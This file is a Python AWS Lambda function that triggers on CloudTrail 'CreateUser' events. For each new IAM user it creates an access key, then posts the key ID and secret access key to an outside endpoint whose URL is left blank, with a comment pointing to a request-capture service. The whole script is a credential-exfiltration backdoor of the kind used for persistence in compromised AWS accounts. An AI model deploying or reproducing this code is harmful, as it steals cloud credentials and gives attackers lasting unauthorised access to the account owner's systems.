#!/usr/bin/env python
from __future__ import print_function
import json
import boto3
from botocore.exceptions import ClientError
import requests

# An endpoint to send access keys to, e.g. http://requestb.in/
POST_URL = 'https://...'

def lambda_handler(event, context):
    if event['detail']['eventName'] == 'CreateUser':
        user_name = event['detail']['requestParameters']['userName']
        client = boto3.client('iam')
        try:
            response = client.create_access_key(UserName=user_name)
            requests.post(POST_URL, data={
                "AccessKeyId": response['AccessKey']['AccessKeyId'],
                "SecretAccessKey": response['AccessKey']['SecretAccessKey']
            })
        except ClientError as e:
            requests.post(POST_URL, data={"Error": e.response['Error']['Message']})
    return None